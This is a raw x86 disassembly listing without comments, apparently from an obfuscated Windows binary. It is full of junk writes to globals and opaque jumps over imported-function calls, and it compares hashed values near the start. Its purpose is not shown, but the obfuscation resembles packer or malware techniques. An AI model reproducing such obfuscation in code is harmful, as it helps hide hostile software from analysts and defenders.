  41f746:	shld   ecx,eax,0x2
  41f74a:	shl    eax,0x2
  41f74d:	xor    eax,ebx
  41f74f:	xor    ecx,esi
  41f751:	cmp    eax,edx
  41f753:	jne    0x41f761
  41f759:	cmp    ecx,edi
  41f75b:	je     0x41f7db
  41f761:	mov    eax,DWORD PTR [esp+0x58]
  41f765:	mov    eax,DWORD PTR [esp+0x58]
  41f769:	mov    eax,DWORD PTR [esp+0x58]
  41f76d:	mov    ecx,DWORD PTR [esp+0x58]
  41f771:	xor    eax,0xa3e69a9f
  41f776:	xor    ecx,0x1
  41f779:	shr    eax,0x2
  41f77c:	shl    ecx,0x1e
  41f77f:	or     eax,ecx
  41f781:	xor    ecx,ecx
  41f783:	shld   ecx,eax,0x2
  41f787:	shl    eax,0x2
  41f78a:	xor    eax,ebx
  41f78c:	xor    ecx,esi
  41f78e:	cmp    eax,0xba699577
  41f793:	jne    0x41f7a1
  41f799:	cmp    ecx,esi
  41f79b:	je     0x41f822
  41f7a1:	mov    eax,DWORD PTR [esp+0x68]
  41f7a5:	cdq    
  41f7a6:	mov    eax,DWORD PTR [esp+0x68]
  41f7aa:	mov    ecx,edx
  41f7ac:	cdq    
  41f7ad:	shld   edx,eax,0x2
  41f7b1:	shr    ecx,0x1e
  41f7b4:	xor    edi,edi
  41f7b6:	shl    eax,0x2
  41f7b9:	or     eax,ecx
  41f7bb:	or     edx,edi
  41f7bd:	mov    ecx,edx
  41f7bf:	mov    edx,DWORD PTR [esp+0x20]
  41f7c3:	xor    eax,ebx
  41f7c5:	xor    ecx,esi
  41f7c7:	mov    esi,DWORD PTR [esp+0x24]
  41f7cb:	cmp    edx,eax
  41f7cd:	jne    0x41f7db
  41f7d3:	cmp    esi,ecx
  41f7d5:	je     0x41f822
  41f7db:	push   DWORD PTR ds:0x422358
  41f7e1:	push   DWORD PTR ds:0x4220ec
  41f7e7:	mov    eax,ds:0x422268
  41f7ec:	mov    eax,DWORD PTR [eax+0x1a4]
  41f7f2:	push   DWORD PTR [eax]
  41f7f4:	mov    eax,DWORD PTR [esp+0x6c]
  41f7f8:	call   eax
  41f7fa:	mov    ecx,DWORD PTR ds:0x422268
  41f800:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41f806:	mov    DWORD PTR [ecx],eax
  41f808:	mov    eax,ds:0x422268
  41f80d:	push   0x4
  41f80f:	add    eax,0x1dc
  41f814:	push   eax
  41f815:	lea    eax,[esp+0x94]
  41f81c:	push   eax
  41f81d:	call   0x41d307
  41f822:	mov    eax,DWORD PTR [esp+0x8c]
  41f829:	mov    eax,DWORD PTR [eax]
  41f82b:	pop    edi
  41f82c:	pop    esi
  41f82d:	pop    ebx
  41f82e:	mov    esp,ebp
  41f830:	pop    ebp
  41f831:	ret    0xc
  41f834:	push   ebp
  41f835:	mov    ebp,esp
  41f837:	sub    esp,0x23c
  41f83d:	cmp    DWORD PTR ds:0x4228c2,0x0
  41f844:	mov    DWORD PTR ds:0x42297a,0x7f83
  41f84e:	mov    DWORD PTR ds:0x4228d6,0x6307
  41f858:	movzx  ecx,BYTE PTR ds:0x4228ba
  41f85f:	jmp    0x41f8d5
  41f864:	mov    eax,0x73d2
  41f869:	ja     0x41f8b5
  41f86f:	push   0x7572
  41f874:	push   0x3356
  41f879:	push   DWORD PTR [ebp-0x18]
  41f87c:	call   DWORD PTR ds:0x42a08c
  41f882:	movzx  ecx,WORD PTR ds:0x4228c6
  41f889:	sub    DWORD PTR ds:0x42289e,ecx
  41f88f:	add    DWORD PTR ds:0x42298a,0x51b4
  41f899:	xor    DWORD PTR ds:0x4228ae,0x409b
  41f8a3:	mov    ecx,DWORD PTR ds:0x4229a2
  41f8a9:	or     ecx,DWORD PTR ds:0x42293e
  41f8af:	mov    DWORD PTR ds:0x4229a2,ecx
  41f8b5:	sbb    ecx,DWORD PTR ds:0x4229d2
  41f8bb:	sbb    DWORD PTR ds:0x422926,0x11d6
  41f8c5:	mov    DWORD PTR ds:0x4228ca,0x27b8
  41f8cf:	sbb    DWORD PTR ds:0x422976,edi
  41f8d5:	push   ebx
  41f8d6:	and    eax,ecx
  41f8d8:	push   esi
  41f8d9:	movzx  ecx,WORD PTR ds:0x42293a
  41f8e0:	and    DWORD PTR ds:0x42292e,ecx
  41f8e6:	push   edi
  41f8e7:	xor    eax,eax
  41f8e9:	mov    DWORD PTR [ebp-0x50],0x1
  41f8f0:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41f8fa:	mov    DWORD PTR [ebp-0xb8],0x1
  41f904:	or     eax,0x7a0d
  41f909:	mov    ecx,DWORD PTR [ebp-0xb8]
  41f90f:	cmp    DWORD PTR ds:0x4228aa,0x0
  41f916:	mov    DWORD PTR ds:0x4228ea,0x1a45
  41f920:	mov    DWORD PTR ds:0x422906,0x738a
  41f92a:	mov    DWORD PTR ds:0x42290a,edx
  41f930:	mov    DWORD PTR ds:0x42295a,0x6016
  41f93a:	jmp    0x41fa3d
  41f93f:	movzx  eax,BYTE PTR ds:0x422986
  41f946:	mov    DWORD PTR ds:0x422976,ecx
  41f94c:	jae    0x41f993
  41f952:	push   DWORD PTR [ebp-0x10]
  41f955:	push   0x88a2
  41f95a:	push   DWORD PTR [ebp-0x14]
  41f95d:	push   0x19f9
  41f962:	push   DWORD PTR [ebp-0x10]
  41f965:	push   0x407d
  41f96a:	push   DWORD PTR [ebp-0x28]
  41f96d:	push   0x5ee1
  41f972:	push   0x7b11
  41f977:	push   DWORD PTR [ebp-0x20]
  41f97a:	push   DWORD PTR [ebp-0x24]
  41f97d:	call   DWORD PTR ds:0x42a1b8
  41f983:	mov    DWORD PTR ds:0x4228ce,0x1a48
  41f98d:	adc    DWORD PTR ds:0x42290a,ebx
  41f993:	adc    DWORD PTR ds:0x422956,0x4228f2
  41f99d:	adc    DWORD PTR ds:0x42296a,0x42288e
  41f9a7:	cmp    DWORD PTR ds:0x422996,0x0
  41f9ae:	mov    DWORD PTR ds:0x422926,0x4d3f
  41f9b8:	mov    DWORD PTR ds:0x42299a,0x151a
  41f9c2:	mov    DWORD PTR ds:0x422896,0x407
  41f9cc:	mov    DWORD PTR ds:0x422956,0x35c9
  41f9d6:	jmp    0x41fa3d
  41f9db:	mov    eax,ds:0x42296e
  41f9e0:	jne    0x41fa17
  41f9e6:	push   DWORD PTR [ebp-0x18]
  41f9e9:	call   DWORD PTR ds:0x42a1bc
  41f9ef:	xor    DWORD PTR ds:0x42292e,0x4228d2
  41f9f9:	xor    DWORD PTR ds:0x4229a6,0x7795
  41fa03:	xor    DWORD PTR ds:0x42296e,0x5b89
  41fa0d:	add    DWORD PTR ds:0x4228a6,0x3dfd
  41fa17:	sub    DWORD PTR ds:0x42298e,0x1198
  41fa21:	adc    DWORD PTR ds:0x4228ea,0x422902
  41fa2b:	add    DWORD PTR ds:0x4229c6,0x43e7
  41fa35:	xor    DWORD PTR ds:0x422902,ebx
  41fa3b:	neg    eax
  41fa3d:	mov    eax,0x584
  41fa42:	sub    DWORD PTR ds:0x422976,0x422906
  41fa4c:	xor    edx,edx
  41fa4e:	div    ecx
  41fa50:	cmp    DWORD PTR ds:0x42288a,0x0
  41fa57:	mov    ecx,0x7438
  41fa5c:	mov    DWORD PTR ds:0x4229a6,0x7ff6
  41fa66:	mov    ecx,0x49e3
  41fa6b:	mov    DWORD PTR ds:0x42296e,0x37ce
  41fa75:	jmp    0x41fac3
  41fa7a:	mov    DWORD PTR ds:0x4228fa,0x7ac
  41fa84:	jb     0x41fab1
  41fa8a:	push   0x18bc
  41fa8f:	call   DWORD PTR ds:0x42a090
  41fa95:	sbb    DWORD PTR ds:0x4228f2,0xcbd
  41fa9f:	sbb    ecx,DWORD PTR ds:0x4228e2
  41faa5:	sub    DWORD PTR ds:0x42299e,ecx
  41faab:	and    ecx,DWORD PTR ds:0x4228a6
  41fab1:	or     ecx,0x1fe6
  41fab7:	add    DWORD PTR ds:0x4228f6,ebx
  41fabd:	adc    ecx,0x2c1d
  41fac3:	imul   eax,eax,0x51d4
  41fac9:	cmp    DWORD PTR ds:0x4228a6,0x0
  41fad0:	mov    DWORD PTR ds:0x4228da,ecx
  41fad6:	movzx  ecx,WORD PTR ds:0x42297e
  41fadd:	mov    DWORD PTR ds:0x422962,ebx
  41fae3:	jmp    0x41fb2d
  41fae8:	mov    DWORD PTR ds:0x4228e2,edx
  41faee:	ja     0x41fb1b
  41faf4:	push   0x4229a2
  41faf9:	push   DWORD PTR [ebp-0x28]
  41fafc:	push   DWORD PTR [ebp-0x20]
  41faff:	call   DWORD PTR ds:0x42a094
  41fb05:	mov    DWORD PTR ds:0x4228a6,0x230b
  41fb0f:	not    DWORD PTR ds:0x422976
  41fb15:	sub    DWORD PTR ds:0x422986,edi
  41fb1b:	sub    ecx,DWORD PTR ds:0x422982
  41fb21:	adc    ecx,DWORD PTR ds:0x4229be
  41fb27:	sub    ecx,DWORD PTR ds:0x4228fe
  41fb2d:	mov    ecx,DWORD PTR [ebp-0xbc]
  41fb33:	xor    eax,ecx
  41fb35:	sbb    DWORD PTR ds:0x422892,ebx
  41fb3b:	and    eax,0x4c09
  41fb40:	mov    ecx,DWORD PTR [ebp-0x50]
  41fb43:	and    DWORD PTR ds:0x42296e,0x422982
  41fb4d:	xor    edx,edx
  41fb4f:	or     DWORD PTR ds:0x422956,0x4802
  41fb59:	div    ecx
  41fb5b:	add    DWORD PTR ds:0x4229be,0x5f4b
  41fb65:	sub    eax,0x401
  41fb6a:	mov    ecx,DWORD PTR ds:0x4228de
  41fb70:	xor    DWORD PTR ds:0x422996,ecx
  41fb76:	mov    DWORD PTR [ebp-0x90],eax
  41fb7c:	cmp    DWORD PTR ds:0x4228b6,0x0
  41fb83:	mov    DWORD PTR ds:0x4228e6,edx
  41fb89:	not    ecx
  41fb8b:	movzx  ecx,WORD PTR ds:0x4228d6
  41fb92:	jmp    0x41fbc2
  41fb97:	not    eax
  41fb99:	jae    0x41fbb0
  41fb9f:	push   DWORD PTR [ebp-0x10]
  41fba2:	call   DWORD PTR ds:0x42a2d0
  41fba8:	add    ecx,edx
  41fbaa:	and    edx,0x53dd
  41fbb0:	add    DWORD PTR ds:0x42297e,0x1518
  41fbba:	and    edx,edx
  41fbbc:	neg    DWORD PTR ds:0x422986
  41fbc2:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41fbcc:	or     eax,eax
  41fbce:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41fbd5:	cmp    DWORD PTR ds:0x42298e,0x0
  41fbdc:	mov    DWORD PTR ds:0x422932,0x7de
  41fbe6:	mov    edx,0x2edc
  41fbeb:	mov    DWORD PTR ds:0x422946,ebx
  41fbf1:	jmp    0x41fc58
  41fbf6:	mov    DWORD PTR ds:0x4228b6,0xeb6
  41fc00:	mov    ecx,DWORD PTR ds:0x422912
  41fc06:	ja     0x41fc41
  41fc0c:	push   0x8c9b
  41fc11:	call   DWORD PTR ds:0x42a2d4
  41fc17:	and    DWORD PTR ds:0x4228aa,0x7f6
  41fc21:	xor    edx,edx
  41fc23:	add    edx,DWORD PTR ds:0x422916
  41fc29:	add    edx,DWORD PTR ds:0x422922
  41fc2f:	mov    DWORD PTR ds:0x422916,edx
  41fc35:	mov    ecx,DWORD PTR ds:0x42297e
  41fc3b:	xor    DWORD PTR ds:0x42294a,ecx
  41fc41:	dec    edx
  41fc42:	sub    DWORD PTR ds:0x422946,0x422986
  41fc4c:	mov    edx,DWORD PTR ds:0x4228aa
  41fc52:	sub    DWORD PTR ds:0x422962,edx
  41fc58:	mov    DWORD PTR [ebp-0xb4],0x3842
  41fc62:	mov    DWORD PTR ds:0x422906,0x649c
  41fc6c:	mov    eax,DWORD PTR [ebp-0x4c]
  41fc6f:	adc    edx,0x487c
  41fc75:	add    eax,DWORD PTR [ebp-0xb4]
  41fc7b:	neg    edx
  41fc7d:	xor    eax,0x2e02
  41fc82:	xor    edx,edx
  41fc84:	xor    eax,0x7294
  41fc89:	dec    ecx
  41fc8a:	imul   eax,eax,0x68f3
  41fc90:	sub    edx,edx
  41fc92:	mov    ecx,DWORD PTR [ebp-0x8c]
  41fc98:	and    eax,ecx
  41fc9a:	or     edx,0x18d0
  41fca0:	sub    eax,0x2818
  41fca5:	and    DWORD PTR ds:0x4229aa,0x187b
  41fcaf:	mov    DWORD PTR [ebp-0xe8],eax
  41fcb5:	mov    DWORD PTR [ebp-0x70],0x6f89
  41fcbc:	cmp    DWORD PTR ds:0x4229ce,0x0
  41fcc3:	mov    DWORD PTR ds:0x4228d6,0x3c7
  41fccd:	mov    DWORD PTR ds:0x422942,edi
  41fcd3:	movzx  edx,BYTE PTR ds:0x4228aa
  41fcda:	jmp    0x41fd28
  41fcdf:	mov    DWORD PTR ds:0x422966,ecx
  41fce5:	jae    0x41fd1e
  41fceb:	push   0x8302
  41fcf0:	push   0x7bd4
  41fcf5:	push   0x2714
  41fcfa:	push   DWORD PTR [ebp-0x28]
  41fcfd:	push   0x400000
  41fd02:	call   DWORD PTR ds:0x42a2d8
  41fd08:	add    ecx,0x75a1
  41fd0e:	or     edx,DWORD PTR ds:0x42298e
  41fd14:	xor    DWORD PTR ds:0x42289e,0x5495
  41fd1e:	adc    ecx,edx
  41fd20:	sbb    ecx,DWORD PTR ds:0x422992
  41fd26:	not    edx
  41fd28:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41fd32:	adc    DWORD PTR ds:0x4228da,0x189a
  41fd3c:	mov    DWORD PTR [ebp-0x120],0x3c77
  41fd46:	cmp    DWORD PTR ds:0x4229d2,0x0
  41fd4d:	mov    DWORD PTR ds:0x422962,0x782b
  41fd57:	mov    edx,0x3512
  41fd5c:	jmp    0x41fd9f
  41fd61:	mov    DWORD PTR ds:0x422966,0x45e0
  41fd6b:	mov    DWORD PTR ds:0x42298a,ebx
  41fd71:	jle    0x41fd90
  41fd77:	push   0x4f01
  41fd7c:	call   DWORD PTR ds:0x42a2dc
  41fd82:	or     edx,ecx
  41fd84:	adc    edx,DWORD PTR ds:0x4228fa
  41fd8a:	sub    DWORD PTR ds:0x422956,edi
  41fd90:	dec    ecx
  41fd91:	inc    DWORD PTR ds:0x4228c2
  41fd97:	adc    ecx,ecx
  41fd99:	sub    edx,0x2d38
  41fd9f:	mov    DWORD PTR [ebp-0x2c],0x2129
  41fda6:	movzx  edx,WORD PTR ds:0x42290e
  41fdad:	sbb    edx,DWORD PTR ds:0x4229a6
  41fdb3:	mov    DWORD PTR ds:0x42290e,edx
  41fdb9:	mov    eax,DWORD PTR [ebp-0x2c]
  41fdbc:	imul   eax,eax,0x1ada
  41fdc2:	mov    ecx,DWORD PTR [ebp-0x120]
  41fdc8:	and    DWORD PTR ds:0x422892,ebx
  41fdce:	imul   ecx,ecx,0x53ae
  41fdd4:	sbb    edx,DWORD PTR ds:0x422982
  41fdda:	imul   ecx,ecx,0x7447
  41fde0:	mov    edx,DWORD PTR [ebp-0xd0]
  41fde6:	inc    DWORD PTR ds:0x4228be
  41fdec:	and    ecx,edx
  41fdee:	sub    edx,DWORD PTR ds:0x4229a6
  41fdf4:	or     ecx,0x2a20
  41fdfa:	cmp    DWORD PTR ds:0x4228ba,0x0
  41fe01:	mov    DWORD PTR ds:0x422906,edi
  41fe07:	mov    DWORD PTR ds:0x4229d2,edx
  41fe0d:	mov    DWORD PTR ds:0x4228be,edx
  41fe13:	mov    edx,DWORD PTR ds:0x422956
  41fe19:	jmp    0x41fea2
  41fe1e:	mov    DWORD PTR ds:0x4228ba,0x5711
  41fe28:	mov    DWORD PTR ds:0x4228ba,edi
  41fe2e:	ja     0x41fe68
  41fe34:	push   0x3098
  41fe39:	push   0x4227d9
  41fe3e:	push   0x4227af
  41fe43:	push   0x4227eb
  41fe48:	call   DWORD PTR ds:0x42a1c0
  41fe4e:	mov    edx,DWORD PTR ds:0x4229ae
  41fe54:	adc    edx,DWORD PTR ds:0x4228c6
  41fe5a:	mov    DWORD PTR ds:0x4229ae,edx
  41fe60:	not    edx
  41fe62:	xor    edx,DWORD PTR ds:0x422996
  41fe68:	mov    edx,DWORD PTR ds:0x422af2
  41fe6e:	mov    edx,DWORD PTR [edx]
  41fe70:	add    DWORD PTR ds:0x422936,edx
  41fe76:	mov    edx,DWORD PTR ds:0x422892
  41fe7c:	and    DWORD PTR ds:0x422976,edx
  41fe82:	movzx  edx,WORD PTR ds:0x4229ae
  41fe89:	add    DWORD PTR ds:0x4229d2,edx
  41fe8f:	movzx  edx,WORD PTR ds:0x4229aa
  41fe96:	xor    edx,DWORD PTR ds:0x42289a
  41fe9c:	mov    DWORD PTR ds:0x4229aa,edx
  41fea2:	mov    edx,DWORD PTR [ebp-0x70]
  41fea5:	xor    ecx,edx
  41fea7:	add    DWORD PTR ds:0x4228ae,0x42293e
  41feb1:	mov    edx,DWORD PTR [ebp+0x14]
  41feb4:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41febb:	add    DWORD PTR ds:0x422986,0x422936
  41fec5:	lea    eax,[ecx+eax*1-0x45a1]
  41fecc:	sub    ecx,0x1147
  41fed2:	mov    DWORD PTR [ebp-0xb0],eax
  41fed8:	mov    DWORD PTR [ebp-0x11c],0x303f
  41fee2:	mov    DWORD PTR [ebp-0x98],0x51a9
  41feec:	and    DWORD PTR ds:0x4228ee,0x28c
  41fef6:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41ff00:	mov    eax,DWORD PTR [ebp-0xcc]
  41ff06:	xor    eax,0x6f65
  41ff0b:	movzx  ecx,WORD PTR ds:0x42296a
  41ff12:	or     DWORD PTR ds:0x422986,ecx
  41ff18:	mov    ecx,DWORD PTR [ebp-0x98]
  41ff1e:	or     eax,ecx
  41ff20:	xor    DWORD PTR ds:0x422922,0x9d1
  41ff2a:	add    eax,0x161e
  41ff2f:	mov    ecx,DWORD PTR [ebp-0x11c]
  41ff35:	add    DWORD PTR ds:0x422996,0x5a44
  41ff3f:	or     eax,ecx
  41ff41:	and    DWORD PTR ds:0x422922,ebx
  41ff47:	add    eax,0x1cca
  41ff4c:	cmp    DWORD PTR ds:0x422996,0x0
  41ff53:	movzx  ecx,WORD PTR ds:0x4229b6
  41ff5a:	mov    DWORD PTR ds:0x4228ca,ecx
  41ff60:	mov    ecx,0x6e0d
  41ff65:	jmp    0x41ffd9
  41ff6a:	mov    ecx,0x4420
  41ff6f:	mov    DWORD PTR ds:0x4228d2,0xbd6
  41ff79:	jb     0x41ffc3
  41ff7f:	push   DWORD PTR [ebp-0x14]
  41ff82:	push   DWORD PTR [ebp-0x24]
  41ff85:	push   0x422797
  41ff8a:	push   0x81c6
  41ff8f:	push   0x5863
  41ff94:	push   0x7a14
  41ff99:	push   DWORD PTR [ebp-0x14]
  41ff9c:	push   0x36c1
  41ffa1:	call   DWORD PTR ds:0x42a1c4
  41ffa7:	mov    ecx,DWORD PTR ds:0x4229b6
  41ffad:	add    DWORD PTR ds:0x4228da,ecx
  41ffb3:	add    DWORD PTR ds:0x42288e,0x26c4
  41ffbd:	add    ecx,0x5f2e
  41ffc3:	sbb    DWORD PTR ds:0x422972,edi
  41ffc9:	add    DWORD PTR ds:0x42289e,edx
  41ffcf:	sbb    DWORD PTR ds:0x4228a2,0x42293e
  41ffd9:	xor    eax,0x96c9
  41ffde:	mov    DWORD PTR [ebp-0x38],eax
  41ffe1:	mov    DWORD PTR [ebp-0x118],0x6083
  41ffeb:	sbb    ecx,0x49d9
  41fff1:	mov    DWORD PTR [ebp-0x88],0x556
  41fffb:	mov    DWORD PTR [ebp-0x140],0x6c7d
  420005:	mov    eax,DWORD PTR [ebp-0x140]
  42000b:	cmp    DWORD PTR ds:0x42297e,0x0
  420012:	mov    DWORD PTR ds:0x4229ba,0x1d24
  42001c:	mov    ecx,DWORD PTR ds:0x42293e
  420022:	movzx  ecx,WORD PTR ds:0x422986
  420029:	jmp    0x420065
  42002e:	mov    DWORD PTR ds:0x4228be,0x28a1
  420038:	je     0x420059
  42003e:	push   DWORD PTR [ebp-0x18]
  420041:	call   DWORD PTR ds:0x42a2e0
  420047:	add    DWORD PTR ds:0x4228ce,edi
  42004d:	and    DWORD PTR ds:0x4228ce,ebx
  420053:	add    ecx,0x4241
  420059:	xor    ecx,0x765e
  42005f:	sub    DWORD PTR ds:0x4229d2,edi
  420065:	add    eax,0x5af8
  42006a:	mov    ecx,DWORD PTR [ebp-0x88]
  420070:	xor    DWORD PTR ds:0x4229c2,0x1fa8
  42007a:	sub    eax,ecx
  42007c:	cmp    DWORD PTR ds:0x4229d2,0x0
  420083:	mov    ecx,0x1395
  420088:	mov    ecx,DWORD PTR ds:0x4228e6
  42008e:	mov    DWORD PTR ds:0x4228f2,ebx
  420094:	jmp    0x4200fe
  420099:	mov    DWORD PTR ds:0x422972,0x6a84
  4200a3:	mov    DWORD PTR ds:0x4228ea,0x62f2
  4200ad:	jb     0x4200d7
  4200b3:	push   0x3346
  4200b8:	call   DWORD PTR ds:0x42a1c8
  4200be:	add    ecx,0x6b03
  4200c4:	movzx  ecx,WORD PTR ds:0x422912
  4200cb:	add    DWORD PTR ds:0x42288a,ecx
  4200d1:	and    ecx,DWORD PTR ds:0x42292e
  4200d7:	sub    DWORD PTR ds:0x422936,edi
  4200dd:	xor    ecx,ecx
  4200df:	xor    ecx,DWORD PTR ds:0x422962
  4200e5:	add    ecx,DWORD PTR ds:0x422966
  4200eb:	mov    DWORD PTR ds:0x422962,ecx
  4200f1:	movzx  ecx,WORD PTR ds:0x42290e
  4200f8:	or     DWORD PTR ds:0x42294a,ecx
  4200fe:	mov    ecx,DWORD PTR [ebp-0x118]
  420104:	xor    DWORD PTR ds:0x4228ca,0x60cf
  42010e:	lea    eax,[eax+ecx*1+0x68dc]
  420115:	not    ecx
  420117:	or     eax,0x52f6
  42011c:	xor    ecx,0x5502
  420122:	sub    eax,0x1dbfe
  420127:	and    DWORD PTR ds:0x4228ee,0x5b35
  420131:	mov    DWORD PTR [ebp-0xac],eax
  420137:	add    DWORD PTR ds:0x422976,0x4861
  420141:	mov    DWORD PTR [ebp-0x6c],0x4b56
  420148:	mov    DWORD PTR [ebp-0x100],0x49f7
  420152:	mov    eax,DWORD PTR [ebp-0x100]
  420158:	and    ecx,0x658f
  42015e:	add    eax,0x7b60
  420163:	imul   eax,eax,0x5ea
  420169:	mov    ecx,DWORD PTR [ebp-0x6c]
  42016c:	and    DWORD PTR ds:0x42292e,0x4229c6
  420176:	imul   eax,ecx
  420179:	xor    edx,edx
  42017b:	and    DWORD PTR ds:0x42299a,ecx
  420181:	mov    ecx,0x3218d
  420186:	div    ecx
  420188:	adc    DWORD PTR ds:0x42293a,0x4228f2
  420192:	sub    eax,0x24c1
  420197:	cmp    DWORD PTR ds:0x42296e,0x0
  42019e:	mov    DWORD PTR ds:0x4228f6,0x5f97
  4201a8:	mov    ecx,DWORD PTR ds:0x422992
  4201ae:	jmp    0x4201fa
  4201b3:	mov    DWORD PTR ds:0x42290e,0x3c76
  4201bd:	not    DWORD PTR ds:0x4228ae
  4201c3:	jbe    0x4201ea
  4201c9:	push   0x3dff
  4201ce:	call   DWORD PTR ds:0x42a098
  4201d4:	not    ecx
  4201d6:	add    DWORD PTR ds:0x4229ca,0x7a9c
  4201e0:	and    DWORD PTR ds:0x422906,0x510
  4201ea:	xor    DWORD PTR ds:0x4228ae,ebx
  4201f0:	adc    DWORD PTR ds:0x422902,0x422986
  4201fa:	mov    DWORD PTR [ebp-0xa8],eax
  420200:	cmp    DWORD PTR ds:0x422916,0x0
  420207:	mov    ecx,0x7594
  42020c:	mov    ecx,0x61a
  420211:	movzx  ecx,WORD PTR ds:0x4229c6
  420218:	jmp    0x420270
  42021d:	mov    eax,ds:0x42294a
  420222:	mov    DWORD PTR ds:0x4228f6,edi
  420228:	jbe    0x42025c
  42022e:	push   0x1
  420230:	push   0x158d
  420235:	push   DWORD PTR [ebp-0x14]
  420238:	push   0x1baf
  42023d:	call   DWORD PTR ds:0x42a2e4
  420243:	add    ecx,0x4150
  420249:	adc    ecx,0x4614
  42024f:	movzx  ecx,BYTE PTR ds:0x422892
  420256:	and    DWORD PTR ds:0x4228a2,ecx
  42025c:	sub    ecx,ecx
  42025e:	mov    ecx,DWORD PTR ds:0x42289e
  420264:	add    ecx,DWORD PTR ds:0x42298a
  42026a:	mov    DWORD PTR ds:0x42289e,ecx
  420270:	mov    DWORD PTR [ebp-0x84],0x2c40
  42027a:	mov    DWORD PTR [ebp-0x18],0x6013
  420281:	mov    DWORD PTR [ebp-0x80],0xc
  420288:	xor    ecx,ecx
  42028a:	add    ecx,DWORD PTR ds:0x4228be
  420290:	add    DWORD PTR ds:0x4229ce,ecx
  420296:	mov    eax,DWORD PTR [ebp-0x18]
  420299:	or     ecx,DWORD PTR ds:0x42296a
  42029f:	mov    ecx,DWORD PTR [ebp-0x80]
  4202a2:	xor    DWORD PTR ds:0x422912,0x4229b6
  4202ac:	xor    edx,edx
  4202ae:	div    ecx
  4202b0:	sub    ecx,DWORD PTR ds:0x42288a
  4202b6:	imul   eax,eax,0x4312
  4202bc:	cmp    DWORD PTR ds:0x42290a,0x0
  4202c3:	mov    DWORD PTR ds:0x42289a,0x25f4
  4202cd:	mov    DWORD PTR ds:0x4228de,0x6ae8
  4202d7:	mov    DWORD PTR ds:0x422936,0x199e
  4202e1:	jmp    0x4203b4
  4202e6:	mov    DWORD PTR ds:0x4228e6,0x15fd
  4202f0:	jb     0x42032a
  4202f6:	push   0x42293a
  4202fb:	push   0x1346
  420300:	push   DWORD PTR [ebp-0x18]
  420303:	push   0x747f
  420308:	call   DWORD PTR ds:0x42a1cc
  42030e:	and    ecx,DWORD PTR ds:0x42299a
  420314:	mov    ecx,DWORD PTR ds:0x42288a
  42031a:	xor    DWORD PTR ds:0x4229ca,ecx
  420320:	sbb    DWORD PTR ds:0x422926,0xf78
  42032a:	not    DWORD PTR ds:0x4228ca
  420330:	adc    DWORD PTR ds:0x422972,ebx
  420336:	cmp    DWORD PTR ds:0x4228f2,0x0
  42033d:	mov    DWORD PTR ds:0x4229b2,0x21f7
  420347:	mov    DWORD PTR ds:0x4229a6,ebx
  42034d:	mov    DWORD PTR ds:0x4228aa,0x33dc
  420357:	jmp    0x4203b4
  42035c:	mov    DWORD PTR ds:0x42288a,0x359f
  420366:	mov    DWORD PTR ds:0x42297a,0x36a8
  420370:	je     0x420398
  420376:	call   DWORD PTR ds:0x42a2e8
  42037c:	or     ecx,0xc82
  420382:	adc    DWORD PTR ds:0x4229ce,0x7856
  42038c:	neg    DWORD PTR ds:0x4228e6
  420392:	sub    ecx,0x6a4f
  420398:	or     ecx,DWORD PTR ds:0x42290e
  42039e:	adc    ecx,DWORD PTR ds:0x422906
  4203a4:	xor    DWORD PTR ds:0x42290a,0x3a36
  4203ae:	adc    ecx,DWORD PTR ds:0x422972
  4203b4:	add    eax,0x5abe
  4203b9:	dec    ecx
  4203ba:	mov    ecx,DWORD PTR [ebp-0x84]
  4203c0:	sbb    DWORD PTR ds:0x4228ba,0x6729
  4203ca:	xor    eax,ecx
  4203cc:	movzx  ecx,WORD PTR ds:0x42288e
  4203d3:	sub    ecx,DWORD PTR ds:0x4228ce
  4203d9:	mov    DWORD PTR ds:0x42288e,ecx
  4203df:	xor    edx,edx
  4203e1:	mov    ecx,0x5ae
  4203e6:	div    ecx
  4203e8:	and    DWORD PTR ds:0x42289e,ebx
  4203ee:	xor    eax,0x5e8c
  4203f3:	mov    DWORD PTR [ebp-0x48],eax
  4203f6:	mov    DWORD PTR ds:0x4228ae,0x2632
  420400:	mov    DWORD PTR [ebp-0x13c],0x7b18
  42040a:	and    eax,DWORD PTR ds:0x42291e
  420410:	mov    DWORD PTR [ebp-0x138],0x1169
  42041a:	xor    eax,ecx
  42041c:	mov    DWORD PTR [ebp-0x12c],0x1379
  420426:	mov    eax,DWORD PTR [ebp-0x12c]
  42042c:	mov    ecx,0x5856
  420431:	or     DWORD PTR ds:0x422922,0x661e
  42043b:	sub    ecx,eax
  42043d:	dec    eax
  42043e:	shr    ecx,0x2
  420441:	sub    ecx,0x5be6
  420447:	cmp    DWORD PTR ds:0x42291e,0x0
  42044e:	mov    DWORD PTR ds:0x422906,0x5702
  420458:	mov    DWORD PTR ds:0x4228b2,0x24ef
  420462:	jmp    0x4204c1
  420467:	mov    eax,ds:0x4228c6
  42046c:	not    DWORD PTR ds:0x42296e
  420472:	jl     0x4204a5
  420478:	push   0x5bb1
  42047d:	push   0x4228e2
  420482:	push   0x2dbc
  420487:	call   DWORD PTR ds:0x42a09c
  42048d:	add    DWORD PTR ds:0x422996,edx
  420493:	sub    DWORD PTR ds:0x4228d2,ecx
  420499:	and    DWORD PTR ds:0x4228ae,ebx
  42049f:	adc    DWORD PTR ds:0x42299e,edi
  4204a5:	adc    DWORD PTR ds:0x4229be,edi
  4204ab:	add    DWORD PTR ds:0x42294a,edi
  4204b1:	add    DWORD PTR ds:0x4228da,0x3429
  4204bb:	sub    DWORD PTR ds:0x42296e,ecx
  4204c1:	mov    eax,DWORD PTR [ebp-0x138]
  4204c7:	imul   ecx,eax
  4204ca:	xor    DWORD PTR ds:0x4229aa,ebx
  4204d0:	mov    eax,DWORD PTR [ebp-0x13c]
  4204d6:	xor    DWORD PTR ds:0x42298e,0x5901
  4204e0:	and    ecx,eax
  4204e2:	mov    eax,0x3b18
  4204e7:	and    DWORD PTR ds:0x4228b6,0x42293e
  4204f1:	sub    eax,ecx
  4204f3:	or     DWORD PTR ds:0x4228ee,0x4ab5
  4204fd:	mov    DWORD PTR [ebp-0xfc],eax
  420503:	mov    ecx,DWORD PTR ds:0x4228aa
  420509:	sbb    DWORD PTR ds:0x42288a,ecx
  42050f:	mov    DWORD PTR [ebp-0x28],0x16d7
  420516:	xor    eax,eax
